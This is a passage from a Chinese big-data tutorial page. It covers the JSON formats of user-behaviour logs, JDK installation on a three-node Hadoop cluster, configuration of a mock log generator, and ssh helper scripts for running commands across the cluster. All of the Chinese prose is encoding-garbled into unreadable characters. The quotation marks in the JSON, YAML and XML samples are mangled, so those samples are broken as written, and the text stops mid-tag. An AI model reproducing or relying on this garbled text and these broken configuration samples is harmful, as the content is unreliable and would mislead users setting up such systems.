title="é¡µé¢æ—¥å¿—"></a>é¡µé¢æ—¥å¿—</h4><p>é¡µé¢æ—¥å¿—ï¼Œä»¥é¡µé¢æµè§ˆä¸ºå•ä½ï¼Œå³ä¸€ä¸ªé¡µé¢æµè§ˆè®°å½•ï¼Œç”Ÿæˆä¸€æ¡é¡µé¢åŸ‹ç‚¹æ—¥å¿—ã€‚ä¸€æ¡<strong>å®Œæ•´</strong>çš„é¡µé¢æ—¥å¿—åŒ…å«ï¼Œä¸€ä¸ªé¡µé¢æµè§ˆè®°å½•ï¼Œè‹¥å¹²ä¸ªç”¨æˆ·åœ¨è¯¥é¡µé¢æ‰€åšçš„åŠ¨ä½œè®°å½•ï¼Œè‹¥å¹²ä¸ªè¯¥é¡µé¢çš„æ›å…‰è®°å½•ï¼Œä»¥åŠä¸€ä¸ªåœ¨è¯¥é¡µé¢å‘ç”Ÿçš„æŠ¥é”™è®°å½•ã€‚é™¤ä¸Šè¿°è¡Œä¸ºä¿¡æ¯ï¼Œé¡µé¢æ—¥å¿—è¿˜åŒ…å«äº†è¿™äº›è¡Œä¸ºæ‰€å¤„çš„å„ç§ç¯å¢ƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯ç­‰ã€‚</p><p>{</p><p>â€œcommonâ€: { â€“ ç¯å¢ƒä¿¡æ¯</p><p>â€œarâ€: â€œ230000â€, â€“ åœ°åŒºç¼–ç </p><p>â€œbaâ€: â€œiPhoneâ€, â€“ æ‰‹æœºå“ç‰Œ</p><p>â€œchâ€: â€œAppstoreâ€, â€“ æ¸ é“</p><p>â€œis_newâ€:<br>â€œ1â€,â€“æ˜¯å¦é¦–æ—¥ä½¿ç”¨ï¼Œé¦–æ¬¡ä½¿ç”¨çš„å½“æ—¥ï¼Œè¯¥å­—æ®µå€¼ä¸º1ï¼Œè¿‡äº†24:00ï¼Œè¯¥å­—æ®µç½®ä¸º0ã€‚</p><p>â€œmdâ€: â€œiPhone 8â€, â€“ æ‰‹æœºå‹å·</p><p>â€œmidâ€: â€œYXfhjAYH6As2z9Iqâ€, â€“ è®¾å¤‡id</p><p>â€œosâ€: â€œiOS 13.2.9â€, â€“ æ“ä½œç³»ç»Ÿ</p><p>â€œuidâ€: â€œ485â€, â€“ ä¼šå‘˜id</p><p>â€œvcâ€: â€œv2.1.134â€ â€“ appç‰ˆæœ¬å·</p><p>},</p><p>â€œactionsâ€: [ â€“åŠ¨ä½œ(äº‹ä»¶)</p><p>{</p><p>â€œaction_idâ€: â€œfavor_addâ€, â€“åŠ¨ä½œid</p><p>â€œitemâ€: â€œ3â€, â€“ç›®æ ‡id</p><p>â€œitem_typeâ€: â€œsku_idâ€, â€“ç›®æ ‡ç±»å‹</p><p>â€œtsâ€: 1585744376605 â€“åŠ¨ä½œæ—¶é—´æˆ³</p><p>}</p><p>],</p><p>â€œdisplaysâ€: [</p><p>{</p><p>â€œdisplayTypeâ€: â€œqueryâ€, â€“ æ›å…‰ç±»å‹</p><p>â€œitemâ€: â€œ3â€, â€“ æ›å…‰å¯¹è±¡id</p><p>â€œitem_typeâ€: â€œsku_idâ€, â€“ æ›å…‰å¯¹è±¡ç±»å‹</p><p>â€œorderâ€: 1, â€“å‡ºç°é¡ºåº</p><p>â€œpos_idâ€: 2 â€“æ›å…‰ä½ç½®</p><p>},</p><p>{</p><p>â€œdisplayTypeâ€: â€œpromotionâ€,</p><p>â€œitemâ€: â€œ6â€,</p><p>â€œitem_typeâ€: â€œsku_idâ€,</p><p>â€œorderâ€: 2,</p><p>â€œpos_idâ€: 1</p><p>},</p><p>{</p><p>â€œdisplayTypeâ€: â€œpromotionâ€,</p><p>â€œitemâ€: â€œ9â€,</p><p>â€œitem_typeâ€: â€œsku_idâ€,</p><p>â€œorderâ€: 3,</p><p>â€œpos_idâ€: 3</p><p>},</p><p>{</p><p>â€œdisplayTypeâ€: â€œrecommendâ€,</p><p>â€œitemâ€: â€œ6â€,</p><p>â€œitem_typeâ€: â€œsku_idâ€,</p><p>â€œorderâ€: 4,</p><p>â€œpos_idâ€: 2</p><p>},</p><p>{</p><p>â€œdisplayTypeâ€: â€œquery â€œ,</p><p>â€œitemâ€: â€œ6â€,</p><p>â€œitem_typeâ€: â€œsku_idâ€,</p><p>â€œorderâ€: 5,</p><p>â€œpos_idâ€: 1</p><p>}</p><p>],</p><p>â€œpageâ€: { â€“é¡µé¢ä¿¡æ¯</p><p>â€œduring_timeâ€: 7648, â€“ æŒç»­æ—¶é—´æ¯«ç§’</p><p>â€œitemâ€: â€œ3â€, â€“ ç›®æ ‡id</p><p>â€œitem_typeâ€: â€œsku_idâ€, â€“ ç›®æ ‡ç±»å‹</p><p>â€œlast_page_idâ€: â€œloginâ€, â€“ ä¸Šé¡µç±»å‹</p><p>â€œpage_idâ€: â€œgood_detailâ€, â€“ é¡µé¢ID</p><p>â€œsourceTypeâ€: â€œpromotionâ€ â€“ æ¥æºç±»å‹</p><p>},</p><p>â€œerrâ€:{ â€“é”™è¯¯</p><p>â€œerror_codeâ€: â€œ1234â€, â€“é”™è¯¯ç </p><p>â€œmsgâ€: â€œ***********â€œ â€“é”™è¯¯ä¿¡æ¯</p><p>},</p><p>â€œtsâ€: 1585744374423 â€“è·³å…¥æ—¶é—´æˆ³</p><p>}</p><h4 id="å¯åŠ¨æ—¥å¿—"><a href="#å¯åŠ¨æ—¥å¿—" class="headerlink" title="å¯åŠ¨æ—¥å¿—"></a>å¯åŠ¨æ—¥å¿—</h4><p>å¯åŠ¨æ—¥å¿—ä»¥å¯åŠ¨ä¸ºå•ä½ï¼ŒåŠä¸€æ¬¡å¯åŠ¨è¡Œä¸ºï¼Œç”Ÿæˆä¸€æ¡å¯åŠ¨æ—¥å¿—ã€‚ä¸€æ¡å®Œæ•´çš„å¯åŠ¨æ—¥å¿—åŒ…æ‹¬ä¸€ä¸ªå¯åŠ¨è®°å½•ï¼Œä¸€ä¸ªæœ¬æ¬¡å¯åŠ¨æ—¶çš„æŠ¥é”™è®°å½•ï¼Œä»¥åŠå¯åŠ¨æ—¶æ‰€å¤„çš„ç¯å¢ƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ä¿¡æ¯ã€æ—¶é—´ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯ã€è®¾å¤‡ä¿¡æ¯ã€åº”ç”¨ä¿¡æ¯ã€æ¸ é“ä¿¡æ¯ç­‰ã€‚</p><p>{</p><p>â€œcommonâ€: {</p><p>â€œarâ€: â€œ370000â€,</p><p>â€œbaâ€: â€œHonorâ€,</p><p>â€œchâ€: â€œwandoujiaâ€,</p><p>â€œis_newâ€: â€œ1â€,</p><p>â€œmdâ€: â€œHonor 20sâ€,</p><p>â€œmidâ€: â€œeQF5boERMJFOujcpâ€,</p><p>â€œosâ€: â€œAndroid 11.0â€,</p><p>â€œuidâ€: â€œ76â€,</p><p>â€œvcâ€: â€œv2.1.134â€</p><p>},</p><p>â€œstartâ€: {</p><p>â€œentryâ€: â€œiconâ€, â€“iconæ‰‹æœºå›¾æ ‡ notice é€šçŸ¥ install å®‰è£…åå¯åŠ¨</p><p>â€œloading_timeâ€: 18803, â€“å¯åŠ¨åŠ è½½æ—¶é—´</p><p>â€œopen_ad_idâ€: 7, â€“å¹¿å‘Šé¡µID</p><p>â€œopen_ad_msâ€: 3449, â€“ å¹¿å‘Šæ€»å…±æ’­æ”¾æ—¶é—´</p><p>â€œopen_ad_skip_msâ€: 1989 â€“ ç”¨æˆ·è·³è¿‡å¹¿å‘Šæ—¶ç‚¹</p><p>},</p><p>â€œerrâ€:{ â€“é”™è¯¯</p><p>â€œerror_codeâ€: â€œ1234â€, â€“é”™è¯¯ç </p><p>â€œmsgâ€: â€œ***********â€œ â€“é”™è¯¯ä¿¡æ¯</p><p>},</p><p>â€œtsâ€: 1585744304000</p><p>}</p><h3 id="æ¨¡æ‹Ÿç”Ÿæˆç”¨æˆ·è¡Œä¸ºæ—¥å¿—"><a href="#æ¨¡æ‹Ÿç”Ÿæˆç”¨æˆ·è¡Œä¸ºæ—¥å¿—" class="headerlink" title="æ¨¡æ‹Ÿç”Ÿæˆç”¨æˆ·è¡Œä¸ºæ—¥å¿—"></a>æ¨¡æ‹Ÿç”Ÿæˆç”¨æˆ·è¡Œä¸ºæ—¥å¿—</h3><h4 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h4><p><strong>1ï¼‰æœåŠ¡å™¨å‡†å¤‡</strong></p><p>å®‰è£…å¦‚ä¸‹æ–‡æ¡£é…ç½®æ­¥éª¤ï¼Œå‡†å¤‡hadoop102ã€hadoop103ã€hadoop104ä¸‰å°è™šæ‹Ÿæœºã€‚</p><p>å¦‚éœ€ä½¿ç”¨é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼Œå¯å‚è€ƒä»¥ä¸‹æ–‡æ¡£ã€‚</p><p><strong>2ï¼‰JDKå‡†å¤‡</strong></p><p><strong>ï¼ˆ1ï¼‰å¸è½½ç°æœ‰JDKï¼ˆ3å°èŠ‚ç‚¹ï¼‰</strong></p><p>[atguigu@hadoop102 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p>[atguigu@hadoop103 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p>[atguigu@hadoop104 opt]## sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e<br>--nodeps</p><p><strong>ï¼ˆ2ï¼‰ç”¨SecureCRTå·¥å…·å°†JDKå¯¼å…¥åˆ°hadoop102çš„/opt/softwareæ–‡ä»¶å¤¹ä¸‹é¢</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d44e9b5727d45ae6a1f4733ddb23b743.png"></p><p><strong>ï¼ˆ3ï¼‰ â€œalt+pâ€è¿›å…¥sftpæ¨¡å¼</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/6974407b7e3e788b5446b8bcd2b36466.png"></p><p><strong>ï¼ˆ4ï¼‰é€‰æ‹©jdk1.8æ‹–å…¥å·¥å…·</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b6cdad0ae4a090f67fdc0f30ba9665bc.png"></p><p><strong>ï¼ˆ5ï¼‰åœ¨Linuxç³»ç»Ÿä¸‹çš„optç›®å½•ä¸­æŸ¥çœ‹è½¯ä»¶åŒ…æ˜¯å¦å¯¼å…¥æˆåŠŸ</strong></p><p>[atguigu@hadoop102 software]## ls /opt/software/</p><p>çœ‹åˆ°å¦‚ä¸‹ç»“æœï¼š</p><p>jdk-8u212-linux-x64.tar.gz</p><p><strong>ï¼ˆ6ï¼‰è§£å‹JDKåˆ°/opt/moduleç›®å½•ä¸‹</strong></p><p>[atguigu@hadoop102 software]## tar -zxvf jdk-8u212-linux-x64.tar.gz -C<br>/opt/module/</p><p><strong>ï¼ˆ7ï¼‰é…ç½®JDKç¯å¢ƒå˜é‡</strong></p><p>ï¼ˆ1ï¼‰æ–°å»º/etc/profile.d/my_env.shæ–‡ä»¶</p><p>[atguigu@hadoop102 module]## sudo vim /etc/profile.d/my_env.sh</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œç„¶åä¿å­˜ï¼ˆ:wqï¼‰é€€å‡º</p><p>##JAVA_HOME</p><p>export JAVA_HOME=/opt/module/jdk1.8.0_212</p><p>export PATH=$PATH:$JAVA_HOME/bin</p><p>ï¼ˆ2ï¼‰è®©ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>ï¼ˆ8ï¼‰æµ‹è¯•JDKæ˜¯å¦å®‰è£…æˆåŠŸ</strong></p><p>[atguigu@hadoop102 module]## java -version</p><p>å¦‚æœèƒ½çœ‹åˆ°ä»¥ä¸‹ç»“æœã€åˆ™Javaæ­£å¸¸å®‰è£…</p><p>java version â€œ1.8.0_212â€</p><p><strong>ï¼ˆ9ï¼‰åˆ†å‘JDK</strong></p><p>[atguigu@hadoop102 module]$ xsync /opt/module/jdk1.8.0_212/</p><p><strong>ï¼ˆ10ï¼‰åˆ†å‘ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 module]$ sudo /home/atguigu/bin/xsync<br>/etc/profile.d/my_env.sh</p><p><strong>ï¼ˆ11ï¼‰åˆ†åˆ«åœ¨hadoop103ã€hadoop104ä¸Šæ‰§è¡Œsource</strong></p><p>[atguigu@hadoop103 module]$ source /etc/profile.d/my_env.sh</p><p>[atguigu@hadoop104 module]$ source /etc/profile.d/my_env.sh</p><p><strong>3ï¼‰ç¯å¢ƒå˜é‡é…ç½®è¯´æ˜</strong></p><p>Linuxçš„ç¯å¢ƒå˜é‡å¯åœ¨å¤šä¸ªæ–‡ä»¶ä¸­é…ç½®ï¼Œå¦‚/etc/profileï¼Œ/etc/profile.d/*.shï¼Œ~/.bashrcï¼Œ~/.bash_profileç­‰ï¼Œä¸‹é¢è¯´æ˜ä¸Šè¿°å‡ ä¸ªæ–‡ä»¶ä¹‹é—´çš„å…³ç³»å’ŒåŒºåˆ«ã€‚</p><p>bashçš„è¿è¡Œæ¨¡å¼å¯åˆ†ä¸ºlogin shellå’Œnon-login shellã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬é€šè¿‡ç»ˆç«¯ï¼Œè¾“å…¥ç”¨æˆ·åã€å¯†ç ï¼Œç™»å½•ç³»ç»Ÿä¹‹åï¼Œå¾—åˆ°å°±æ˜¯ä¸€ä¸ªlogin<br>shellï¼Œè€Œå½“æˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ssh hadoop103<br>commandï¼Œåœ¨hadoop103æ‰§è¡Œcommandçš„å°±æ˜¯ä¸€ä¸ªnon-login shellã€‚</p><p>è¿™ä¸¤ç§shellçš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå®ƒä»¬å¯åŠ¨æ—¶ä¼šåŠ è½½ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œlogin<br>shellå¯åŠ¨æ—¶ä¼šåŠ è½½/etc/profileï¼Œ~/.bash_profileï¼Œ~/.bashrcï¼Œnon-login<br>shellå¯åŠ¨æ—¶ä¼šåŠ è½½~/.bashrcã€‚å³login shellä¼šå¤šåŠ è½½/etc/profileæ–‡ä»¶ã€‚</p><p>è€Œåœ¨åŠ è½½~/.bashrcï¼ˆå®é™…æ˜¯~/.bashrcä¸­åŠ è½½çš„/etc/bashrcï¼‰æˆ–/etc/profileæ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œ</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f33dbe2730179246e8ec1808a780b4bc.png"></p><p>å› æ­¤ä¸ç®¡æ˜¯login shellè¿˜æ˜¯non-login<br>shellï¼Œå¯åŠ¨æ—¶éƒ½ä¼šåŠ è½½/etc/profile.d/*.shä¸­çš„ç¯å¢ƒå˜é‡ã€‚è€Œlogin<br>shellä¼šå¤šåŠ è½½/etc/profile.d/sh.localæ–‡ä»¶ã€‚</p><h4 id="æ¨¡æ‹Ÿæ•°æ®"><a href="#æ¨¡æ‹Ÿæ•°æ®" class="headerlink" title="æ¨¡æ‹Ÿæ•°æ®"></a>æ¨¡æ‹Ÿæ•°æ®</h4><p><strong>1ï¼‰æ¨¡æ‹Ÿå™¨ä½¿ç”¨è¯´æ˜</strong></p><p><strong>ï¼ˆ1ï¼‰ä¸Šä¼ æ¨¡æ‹Ÿå™¨</strong></p><p>å°†application.ymlã€gmall2020-mock-log-2021-10-10.jarã€path.jsonã€logback.xmlä¸Šä¼ åˆ°hadoop102çš„/opt/module/applogç›®å½•ä¸‹</p><p><strong>åˆ›å»ºapplogè·¯å¾„</strong></p><p>[atguigu@hadoop102 module]$ mkdir /opt/module/applog</p><p><strong>ä¸Šä¼ æ–‡ä»¶</strong></p><p><strong>ï¼ˆ2ï¼‰é…ç½®æ–‡ä»¶è¯´æ˜</strong></p><p><strong>application.ymlæ–‡ä»¶</strong></p><p>å¯ä»¥æ ¹æ®éœ€æ±‚ç”Ÿæˆå¯¹åº”æ—¥æœŸçš„ç”¨æˆ·è¡Œä¸ºæ—¥å¿—ã€‚</p><p>[atguigu@hadoop102 applog]$ vim application.yml</p><p>ä¿®æ”¹å¦‚ä¸‹å†…å®¹</p><p>## å¤–éƒ¨é…ç½®æ‰“å¼€</p><p>logging.config: â€œ./logback.xmlâ€</p><p>##ä¸šåŠ¡æ—¥æœŸ å³æ•°æ®å†…çš„æ—¶é—´æˆ³</p><p>mock.date: â€œ2020-06-14â€</p><p>##æ¨¡æ‹Ÿæ•°æ®å‘é€æ¨¡å¼</p><p>mock.type: â€œlogâ€</p><p>##mock.type: â€œhttpâ€</p><p>##mock.type: â€œkafkaâ€</p><p>##httpæ¨¡å¼ä¸‹ï¼Œå‘é€çš„åœ°å€ æ²¡æœ‰ä½¿ç”¨</p><p>mock.url: â€œ<a href="http://localhost:8090/applog&quot;">http://localhost:8090/applog&quot;</a></p><p>##kafkaæ¨¡å¼ä¸‹ï¼Œå‘é€çš„åœ°å€ æ²¡æœ‰ä½¿ç”¨</p><p>mock:</p><p>kafka-server: â€œhdp1:9092,hdp2:9092,hdp3:9092â€</p><p>kafka-topic: â€œODS_BASE_LOGâ€</p><p>##å¯åŠ¨æ¬¡æ•°</p><p>mock.startup.count: 200</p><p>##è®¾å¤‡æœ€å¤§å€¼</p><p>mock.max.mid: 1000000</p><p>##ä¼šå‘˜æœ€å¤§å€¼</p><p>mock.max.uid: 1000</p><p>##å•†å“æœ€å¤§å€¼</p><p>mock.max.sku-id: 35</p><p>##é¡µé¢å¹³å‡è®¿é—®æ—¶é—´</p><p>mock.page.during-time-ms: 20000</p><p>##é”™è¯¯æ¦‚ç‡ ç™¾åˆ†æ¯”</p><p>mock.error.rate: 3</p><p>##æ¯æ¡æ—¥å¿—å‘é€å»¶è¿Ÿ ms</p><p>mock.log.sleep: 20</p><p>##å•†å“è¯¦æƒ…æ¥æº ç”¨æˆ·æŸ¥è¯¢ï¼Œå•†å“æ¨å¹¿ï¼Œæ™ºèƒ½æ¨è, ä¿ƒé”€æ´»åŠ¨</p><p>mock.detail.source-type-rate: â€œ40:25:15:20â€</p><p>##é¢†å–è´­ç‰©åˆ¸æ¦‚ç‡</p><p>mock.if_get_coupon_rate: 75</p><p>##è´­ç‰©åˆ¸æœ€å¤§id</p><p>mock.max.coupon-id: 3</p><p>##æœç´¢å…³é”®è¯</p><p>mock.search.keyword: â€œå›¾ä¹¦,å°ç±³,iphone11,ç”µè§†,å£çº¢,ps5,è‹¹æœæ‰‹æœº,å°ç±³ç›’å­â€</p><p>## ç”·å¥³æµè§ˆå•†å“æ¯”é‡ï¼ˆ35sku)</p><p>mock.sku-weight.male:<br>â€œ10:10:10:10:10:10:10:5:5:5:5:5:10:10:10:10:12:12:12:12:12:5:5:5:5:3:3:3:3:3:3:3:3:10:10â€</p><p>mock.sku-weight.female:<br>â€œ1:1:1:1:1:1:1:5:5:5:5:5:1:1:1:1:2:2:2:2:2:8:8:8:8:15:15:15:15:15:15:15:15:1:1â€</p><p><strong>path.json</strong></p><p>è¯¥æ–‡ä»¶ç”¨æ¥é…ç½®è®¿é—®è·¯å¾„ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚ï¼Œçµæ´»é…ç½®ç”¨æˆ·è®¿é—®è·¯å¾„ã€‚</p><p>[</p><p>{â€œpathâ€:[â€œhomeâ€,â€good_listâ€,â€good_detailâ€,â€cartâ€,â€tradeâ€,â€paymentâ€],â€rateâ€:20 },</p><p>{â€œpathâ€:[â€œhomeâ€,â€searchâ€,â€good_listâ€,â€good_detailâ€,â€loginâ€,â€good_detailâ€,â€cartâ€,â€tradeâ€,â€paymentâ€],â€rateâ€:30<br>},</p><p>{â€œpathâ€:[â€œhomeâ€,â€searchâ€,â€good_listâ€,â€good_detailâ€,â€loginâ€,â€registerâ€,â€good_detailâ€,â€cartâ€,â€tradeâ€,â€paymentâ€],â€rateâ€:20<br>},</p><p>{â€œpathâ€:[â€œhomeâ€,â€mineâ€,â€orders_unpaidâ€,â€tradeâ€,â€paymentâ€],â€rateâ€:10 },</p><p>{â€œpathâ€:[â€œhomeâ€,â€mineâ€,â€orders_unpaidâ€,â€good_detailâ€,â€good_specâ€,â€commentâ€,â€tradeâ€,â€paymentâ€],â€rateâ€:5<br>},</p><p>{â€œpathâ€:[â€œhomeâ€,â€mineâ€,â€orders_unpaidâ€,â€good_detailâ€,â€good_specâ€,â€commentâ€,â€homeâ€],â€rateâ€:5<br>},</p><p>{â€œpathâ€:[â€œhomeâ€,â€good_detailâ€],â€rateâ€:20 },</p><p>{â€œpathâ€:[â€œhomeâ€ ],â€rateâ€:10 }</p><p>]</p><p><strong>logbacké…ç½®æ–‡ä»¶</strong></p><p>å¯é…ç½®æ—¥å¿—ç”Ÿæˆè·¯å¾„ï¼Œä¿®æ”¹å†…å®¹å¦‚ä¸‹</p><p>&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt;</p><p>&lt;configuration&gt;</p><p>&lt;property name=â€**LOG_HOME**â€ value=â€**/opt/module/applog/log**â€ /&gt;</p><p>&lt;appender name=â€consoleâ€ class=â€ch.qos.logback.core.ConsoleAppenderâ€&gt;</p><p>&lt;encoder&gt;</p><p>&lt;pattern&gt;%msg%n&lt;/pattern&gt;</p><p>&lt;/encoder&gt;</p><p>&lt;/appender&gt;</p><p>&lt;appender name=â€rollingFileâ€<br>class=â€ch.qos.logback.core.rolling.RollingFileAppenderâ€&gt;</p><p>&lt;rollingPolicy class=â€ch.qos.logback.core.rolling.TimeBasedRollingPolicyâ€&gt;</p><p>&lt;fileNamePattern&gt;${LOG_HOME}/app.%d{yyyy-MM-dd}.log&lt;/fileNamePattern&gt;</p><p>&lt;/rollingPolicy&gt;</p><p>&lt;encoder&gt;</p><p>&lt;pattern&gt;%msg%n&lt;/pattern&gt;</p><p>&lt;/encoder&gt;</p><p>&lt;/appender&gt;</p><p>&lt;!â€“ å°†æŸä¸€ä¸ªåŒ…ä¸‹æ—¥å¿—å•ç‹¬æ‰“å°æ—¥å¿— â€“&gt;</p><p>&lt;logger name=â€com.atguigu.gmall2020.mock.log.util.LogUtilâ€</p><p>level=â€INFOâ€ additivity=â€falseâ€&gt;</p><p>&lt;appender-ref ref=â€rollingFileâ€ /&gt;</p><p>&lt;appender-ref ref=â€consoleâ€ /&gt;</p><p>&lt;/logger&gt;</p><p>&lt;root level=â€errorâ€ &gt;</p><p>&lt;appender-ref ref=â€consoleâ€ /&gt;</p><p>&lt;!â€“ &lt;appender-ref ref=â€async-rollingFileâ€ /&gt; â€“&gt;</p><p>&lt;/root&gt;</p><p>&lt;/configuration&gt;</p><p><strong>2ï¼‰ç”Ÿæˆæ—¥å¿—</strong></p><p>ï¼ˆ1ï¼‰è¿›å…¥åˆ°/opt/module/applogè·¯å¾„ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><p>[atguigu@hadoop102 applog]$ java -jar gmall2020-mock-log-2021-10-10.jar</p><p>ï¼ˆ2ï¼‰åœ¨/opt/module/applog/logç›®å½•ä¸‹æŸ¥çœ‹ç”Ÿæˆæ—¥å¿—</p><p>[atguigu@hadoop102 log]$ ll</p><p><strong>3ï¼‰é›†ç¾¤æ—¥å¿—ç”Ÿæˆè„šæœ¬</strong></p><p><strong>åœ¨hadoop102çš„/home/atguiguç›®å½•ä¸‹åˆ›å»ºbinç›®å½•ï¼Œè¿™æ ·è„šæœ¬å¯ä»¥åœ¨æœåŠ¡å™¨çš„ä»»ä½•ç›®å½•æ‰§è¡Œã€‚</strong></p><p>[atguigu@hadoop102 ~]$ echo $PATH</p><p>/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/atguigu/.local/bin:/home/atguigu/bin</p><p><strong>ï¼ˆ1ï¼‰åœ¨/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬lg.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim lg.sh</p><p><strong>ï¼ˆ2ï¼‰åœ¨è„šæœ¬ä¸­ç¼–å†™å¦‚ä¸‹å†…å®¹</strong></p><p>##!/bin/bash</p><p>for i in hadoop102 hadoop103; do</p><p>echo â€œ========== $i ==========â€</p><p>ssh $i â€œcd /opt/module/applog/; java -jar gmall2020-mock-log-2021-10-10.jar<br>&gt;/dev/null 2&gt;&amp;1 &amp;â€</p><p>done</p><p>æ³¨ï¼š</p><p>/opt/module/applog/ä¸ºjaråŒ…åŠé…ç½®æ–‡ä»¶æ‰€åœ¨è·¯å¾„</p><p>/dev/nullä»£è¡¨linuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€æœ‰å¾€è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥çš„å†…å®¹éƒ½ä¼šä¸¢å¤±ï¼Œä¿—ç§°â€œé»‘æ´â€ã€‚</p><p>æ ‡å‡†è¾“å…¥0ï¼šä»é”®ç›˜è·å¾—è¾“å…¥ /proc/self/fd/0</p><p>æ ‡å‡†è¾“å‡º1ï¼šè¾“å‡ºåˆ°å±å¹•ï¼ˆå³æ§åˆ¶å°ï¼‰ /proc/self/fd/1</p><p>é”™è¯¯è¾“å‡º2ï¼šè¾“å‡ºåˆ°å±å¹•ï¼ˆå³æ§åˆ¶å°ï¼‰ /proc/self/fd/2</p><p><strong>ï¼ˆ3ï¼‰ä¿®æ”¹è„šæœ¬æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod u+x lg.sh</p><p><strong>ï¼ˆ4ï¼‰å°†jaråŒ…åŠé…ç½®æ–‡ä»¶ä¸Šä¼ è‡³hadoop103çš„</strong>/opt/module/applog/<strong>è·¯å¾„</strong></p><p><strong>ï¼ˆ5ï¼‰å¯åŠ¨è„šæœ¬</strong></p><p>[atguigu@hadoop102 module]$ lg.sh</p><p><strong>ï¼ˆ6ï¼‰åˆ†åˆ«åœ¨hadoop102ã€hadoop103çš„/opt/module/applog/logç›®å½•ä¸ŠæŸ¥çœ‹ç”Ÿæˆçš„æ•°æ®</strong></p><p>[atguigu@hadoop102 logs]$ ls</p><p>app.2020-06-14.log</p><p>[atguigu@hadoop103 logs]$ ls</p><p>app.2020-06-14.log</p><h2 id="ç¬¬4ç« -æ•°æ®é‡‡é›†æ¨¡å—"><a href="#ç¬¬4ç« -æ•°æ®é‡‡é›†æ¨¡å—" class="headerlink" title="ç¬¬4ç«  æ•°æ®é‡‡é›†æ¨¡å—"></a>ç¬¬4ç«  æ•°æ®é‡‡é›†æ¨¡å—</h2><h3 id="æ•°æ®é€šé“"><a href="#æ•°æ®é€šé“" class="headerlink" title="æ•°æ®é€šé“"></a>æ•°æ®é€šé“</h3><h3 id="ç¯å¢ƒå‡†å¤‡-1"><a href="#ç¯å¢ƒå‡†å¤‡-1" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><h4 id="é›†ç¾¤æ‰€æœ‰è¿›ç¨‹æŸ¥çœ‹è„šæœ¬"><a href="#é›†ç¾¤æ‰€æœ‰è¿›ç¨‹æŸ¥çœ‹è„šæœ¬" class="headerlink" title="é›†ç¾¤æ‰€æœ‰è¿›ç¨‹æŸ¥çœ‹è„šæœ¬"></a>é›†ç¾¤æ‰€æœ‰è¿›ç¨‹æŸ¥çœ‹è„šæœ¬</h4><p>1ï¼‰åœ¨/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬xcall.sh</p><p>[atguigu@hadoop102 bin]$ vim xcall.sh</p><p>2ï¼‰åœ¨è„šæœ¬ä¸­ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##! /bin/bash</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€”â€”â€” $i â€”â€”â€”-</p><p>ssh $i â€œ$*â€œ</p><p>done</p><p>3ï¼‰ä¿®æ”¹è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod 777 xcall.sh</p><p>4ï¼‰å¯åŠ¨è„šæœ¬</p><p>[atguigu@hadoop102 bin]$ xcall.sh jps</p><p>å¦‚æœåªæ˜¯æŸ¥çœ‹é›†ç¾¤è¿›ç¨‹å¯åŠ¨æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨jpsallè„šæœ¬</p><p>##! /bin/bash</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€”â€”â€” $i â€”â€”â€”-</p><p>ssh $i â€œjps $@ | grep -v Jpsâ€</p><p>done</p><h4 id="Hadoopå®‰è£…"><a href="#Hadoopå®‰è£…" class="headerlink" 